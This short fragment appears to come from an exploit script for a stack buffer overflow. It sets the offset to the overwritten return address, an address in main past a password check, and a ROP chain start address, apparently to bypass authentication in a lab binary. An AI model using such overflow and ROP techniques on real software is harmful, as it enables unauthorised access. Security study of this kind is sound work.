...
#length in bytes from the begining of the buffer to the first return address we replace
CRITICAL_LENGTH = 66


#The address in main, after check password
MAIN = 0x80488c6

#Address of the starting place of the ROP code
START = 0xbfffe0cc